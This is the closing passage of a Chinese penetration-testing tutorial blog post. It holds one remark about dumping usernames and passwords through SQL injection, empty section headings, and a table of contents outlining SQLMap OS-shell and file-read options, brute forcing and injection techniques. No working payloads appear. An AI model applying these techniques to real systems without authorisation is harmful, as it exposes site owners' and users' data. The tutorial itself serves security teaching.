<p>成功爆出用户名和密码,同样利用limit爆出其他数据</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729090717689.png" alt=""></p>
<h3 id="SQL注入进阶"><a href="#SQL注入进阶" class="headerlink" title="SQL注入进阶"></a>SQL注入进阶</h3><h4 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h4><h3 id="SQL注入绕过技术"><a href="#SQL注入绕过技术" class="headerlink" title="SQL注入绕过技术"></a>SQL注入绕过技术</h3>
    </div>

   

    
    
    
        <div class="reward-container">
  <div></div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    打赏
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechatpay.png" alt="IdeFun 微信支付">
        <p>微信支付</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.png" alt="IdeFun 支付宝">
        <p>支付宝</p>
      </div>

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>IdeFun
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://www.idefun.com/article/8240bef7.html" title="渗透测试实战指南">http://www.idefun.com/article/8240bef7.html</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <div>
        
        <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>
        
      </div>

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Hack/" rel="tag"><i class="fa fa-tag"></i> Hack</a>
          </div>

        
  <div class="post-widgets">
    <div class="wp_rating">
      <div id="wpac-rating"></div>
    </div>
  </div>


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/article/44a199f9.html" rel="prev" title="Nmap的使用">
      <i class="fa fa-chevron-left"></i> Nmap的使用
    </a></div>
      <div class="post-nav-item">
    <a href="/article/cfda4bcb.html" rel="next" title="初级算法">
      初级算法 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97"><span class="nav-text">渗透测试实战指南</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="nav-text">收集域名信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Whois%E6%9F%A5%E8%AF%A2"><span class="nav-text">Whois查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%87%E6%A1%88%E6%9F%A5%E8%AF%A2"><span class="nav-text">备案查询</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">收集敏感信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF"><span class="nav-text">收集子域名信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%AD%90%E5%9F%9F%E5%90%8D%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="nav-text">1.子域名检测工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9E%9A%E4%B8%BE"><span class="nav-text">2.搜索引擎枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E7%AC%AC%E4%B8%89%E6%96%B9%E8%81%9A%E5%90%88%E5%BA%94%E7%94%A8%E6%9E%9A%E4%B8%BE"><span class="nav-text">3.第三方聚合应用枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%AF%81%E4%B9%A6%E9%80%8F%E6%98%8E%E5%BA%A6%E5%85%AC%E5%BC%80%E6%97%A5%E5%BF%97%E6%9E%9A%E4%B8%BE"><span class="nav-text">4.证书透明度公开日志枚举</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="nav-text">收集常用端口信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="nav-text">文件共享服务端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="nav-text">远程连接服务端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="nav-text">web应用服务端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="nav-text">数据库服务端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="nav-text">邮件服务端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E7%AB%AF%E5%8F%A3"><span class="nav-text">网络常见协议端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3"><span class="nav-text">特殊服务端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-text">指纹识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP"><span class="nav-text">查找真实IP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%98%E5%9C%A8CDN"><span class="nav-text">1.目标服务器存在CDN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8%E4%BA%86CDN"><span class="nav-text">2.判断目标是否使用了CDN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP"><span class="nav-text">3.绕过CDN寻找真实IP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E9%AA%8C%E8%AF%81%E8%8E%B7%E5%8F%96%E7%9A%84IP"><span class="nav-text">4.验证获取的IP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="nav-text">收集敏感目录文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="nav-text">社会工程学</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="nav-text">常用的渗透测试工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLMap"><span class="nav-text">SQLMap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLMap%E5%85%A5%E9%97%A8"><span class="nav-text">SQLMap入门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-text">1.判断是否存在注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%88%A4%E6%96%AD%E6%96%87%E6%9C%AC%E4%B8%AD%E7%9A%84%E8%AF%B7%E6%B1%82%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-text">2.判断文本中的请求是否存在注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">3.查询当前用户下的所有数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="nav-text">4.获取数据库中的表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-text">5.获取表中的字段名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="nav-text">6.获取字段内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7"><span class="nav-text">7.获取数据库的所有用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-text">8.获取数据库用户的密码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%90%8D%E7%A7%B0"><span class="nav-text">9.获取当前网站数据库的名称</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E7%A7%B0"><span class="nav-text">10.获取当前网站数据库的用户名称</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLMap%E8%BF%9B%E9%98%B6"><span class="nav-text">SQLMap进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E2%80%94level-5-%E6%8E%A2%E6%B5%8B%E7%AD%89%E7%BA%A7"><span class="nav-text">1.—level 5:探测等级</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E2%80%94is-dba-%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E4%B8%BA%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90"><span class="nav-text">2.—is-dba:当前用户是否为管理权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E2%80%94roles-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%91%98%E8%A7%92%E8%89%B2"><span class="nav-text">3.—roles:列出数据库管理员角色</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E2%80%94referer-HTTP-Referer%E5%A4%B4"><span class="nav-text">4.—referer:HTTP Referer头</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E2%80%94sql-shell-%E8%BF%90%E8%A1%8C%E8%87%AA%E5%AE%9A%E4%B9%89SQL%E8%AF%AD%E5%8F%A5"><span class="nav-text">5.—sql-shell:运行自定义SQL语句</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E2%80%94os-cmd-%E2%80%94os-shell-%E8%BF%90%E8%A1%8C%E4%BB%BB%E6%84%8F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-text">6.—os-cmd,—os-shell:运行任意操作系统命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-%E2%80%94file-read-%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-text">7.—file-read:从数据库服务器中读取文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-%E2%80%94file-write-%E2%80%94file-dest-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD"><span class="nav-text">8.—file-write —file-dest:上传文件到数据库服务器中</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLMap%E8%87%AA%E5%B8%A6%E7%BB%95%E8%BF%87%E8%84%9A%E6%9C%ACtamper%E7%9A%84%E8%AE%B2%E8%A7%A3"><span class="nav-text">SQLMap自带绕过脚本tamper的讲解</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Burp-Suite"><span class="nav-text">Burp Suite</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Burp-Suite%E5%85%A5%E9%97%A8"><span class="nav-text">Burp Suite入门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Proxy"><span class="nav-text">Proxy</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Spider"><span class="nav-text">Spider</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Decoder"><span class="nav-text">Decoder</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Burp-Suite%E8%BF%9B%E9%98%B6"><span class="nav-text">Burp Suite进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Scanner"><span class="nav-text">Scanner</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-Active-Scanning"><span class="nav-text">1.主动扫描(Active Scanning)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F-Passive-Scanning"><span class="nav-text">2.被动扫描(Passive Scanning)</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Intruder"><span class="nav-text">Intruder</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Repeater"><span class="nav-text">Repeater</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Comparer"><span class="nav-text">Comparer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Sequencer"><span class="nav-text">Sequencer</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-text">nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Nmap%E5%85%A5%E9%97%A8"><span class="nav-text">Nmap入门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E5%8F%82%E6%95%B0"><span class="nav-text">扫描参数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-%E8%AE%BE%E7%BD%AE%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E6%97%B6%E7%94%A8%E5%88%B0%E7%9A%84%E7%9B%B8%E5%85%B3%E5%8F%82%E6%95%B0%E3%80%82"><span class="nav-text">1.设置扫描目标时用到的相关参数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-%E4%B8%8E%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E7%9A%84%E5%8F%82%E6%95%B0%E3%80%82"><span class="nav-text">2.与主机发现方法相关的参数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-%E4%B8%8E%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E7%9A%84%E5%8F%82%E6%95%B0%E3%80%82"><span class="nav-text">3.与常见的端口扫描方法相关的参数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-%E8%B7%9F%E7%AB%AF%E5%8F%A3%E5%8F%82%E6%95%B0%E4%B8%8E%E6%89%AB%E6%8F%8F%E9%A1%BA%E5%BA%8F%E7%9A%84%E8%AE%BE%E7%BD%AE%E7%9B%B8%E5%85%B3%E7%9A%84%E5%8F%82%E6%95%B0%E3%80%82"><span class="nav-text">4.跟端口参数与扫描顺序的设置相关的参数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-%E4%B8%8E%E7%89%88%E6%9C%AC%E4%BE%A6%E6%B5%8B%E7%9B%B8%E5%85%B3%E7%9A%84%E5%8F%82%E6%95%B0%E3%80%82"><span class="nav-text">5.与版本侦测相关的参数。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">常用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-%E6%89%AB%E6%8F%8F%E5%8D%95%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80"><span class="nav-text">1.扫描单个目标地址</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-%E6%89%AB%E6%8F%8F%E5%A4%9A%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80"><span class="nav-text">2.扫描多个目标地址</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%AA%E8%8C%83%E5%9B%B4%E5%86%85%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80"><span class="nav-text">3.扫描一个范围内的目标地址</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8%E7%9A%84%E6%9F%90%E4%B8%AA%E7%BD%91%E6%AE%B5"><span class="nav-text">4.扫描目标地址所在的某个网段</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8target-txt%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80"><span class="nav-text">5.扫描主机列表target.txt中的所有目标地址</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#6-%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E4%B8%AA%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80"><span class="nav-text">6.扫描除某一个目标地址之外的所有目标地址</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#7-%E6%89%AB%E6%8F%8F%E9%99%A4%E6%9F%90%E4%B8%80%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E4%B9%8B%E5%A4%96%E7%9A%84%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80"><span class="nav-text">7.扫描除某一文件中的目标地址之外的目标地址</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#8-%E6%89%AB%E6%8F%8F%E6%9F%90%E4%B8%80%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%84%E7%89%B9%E5%AE%9A%E7%AB%AF%E5%8F%A3"><span class="nav-text">8.扫描某一目标地址的特定端口</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#9-%E5%AF%B9%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%B7%AF%E7%94%B1%E8%B7%9F%E8%B8%AA"><span class="nav-text">9.对目标地址进行路由跟踪</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%89%80%E5%9C%A8C%E6%AE%B5%E7%9A%84%E5%9C%A8%E7%BA%BF%E7%8A%B6%E5%86%B5"><span class="nav-text">10.扫描目标地址所在C段的在线状况</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#11-%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="nav-text">11.目标地址的操作系统指纹识别</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#12-%E7%9B%AE%E6%A0%87%E5%9C%B0%E5%9D%80%E6%8F%90%E4%BE%9B%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B"><span class="nav-text">12.目标地址提供的服务版本检测</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#13-%E6%8E%A2%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99%E7%8A%B6%E6%80%81"><span class="nav-text">13.探测防火墙状态</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8A%B6%E6%80%81%E8%AF%86%E5%88%AB"><span class="nav-text">状态识别</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nmap%E8%BF%9B%E9%98%B6"><span class="nav-text">Nmap进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="nav-text">脚本介绍</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC"><span class="nav-text">常见脚本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-text">实例</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-%E9%89%B4%E6%9D%83%E6%89%AB%E6%8F%8F"><span class="nav-text">1.鉴权扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB"><span class="nav-text">2.暴力破解攻击</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-%E6%89%AB%E6%8F%8F%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.扫描常见的漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="nav-text">4.应用服务扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-%E6%8E%A2%E6%B5%8B%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E6%9B%B4%E5%A4%9A%E6%9C%8D%E5%8A%A1%E5%BC%80%E5%90%AF%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">5.探测局域网内更多服务开启的情况</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#6-Whois%E8%A7%A3%E6%9E%90"><span class="nav-text">6.Whois解析</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90"><span class="nav-text">Web安全原理剖析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-text">SQL注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B"><span class="nav-text">SQL注入简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-text">SQL注入的原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-text">SQL注入分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8EMySQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">与MySQL注入相关的知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-MySQL%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="nav-text">1.MySQL查询语句</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-limit%E7%9A%84%E7%94%A8%E6%B3%95"><span class="nav-text">2.limit的用法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E9%9C%80%E8%A6%81%E8%AE%B0%E4%BD%8F%E7%9A%84%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0"><span class="nav-text">3.需要记住的几个函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-text">4.注释符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-text">5.内联注释</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Union%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-text">Union注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Boolean%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-text">Boolean注入攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-text">报错注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#extractvalue%E5%87%BD%E6%95%B0"><span class="nav-text">extractvalue函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#updatexml%E5%87%BD%E6%95%B0"><span class="nav-text">updatexml函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">floor报错注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6"><span 